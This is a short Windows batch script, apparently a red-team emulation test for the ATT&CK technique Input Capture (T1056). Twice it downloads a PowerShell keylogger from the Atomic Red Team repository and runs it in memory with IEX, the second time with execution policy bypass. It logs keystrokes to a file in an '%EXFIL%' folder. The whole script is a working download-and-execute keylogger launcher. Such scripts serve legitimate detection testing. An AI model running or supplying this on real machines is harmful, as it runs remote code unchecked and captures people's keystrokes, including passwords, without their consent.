@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Input Capture (T1056)
ECHO.
ECHO [+] Initiating Powershell Keylogger to capture KeyStrokes
ECHO -------------------------------------------------------------------
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056/Get-Keystrokes.ps1'); Get-Keystrokes  -LogPath %EXFIL%\keycapture.log | powershell.exe -
powershell.exe -ep bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056/Get-Keystrokes.ps1'); Get-Keystrokes  -LogPath %EXFIL%\keycapture.log"
ECHO.
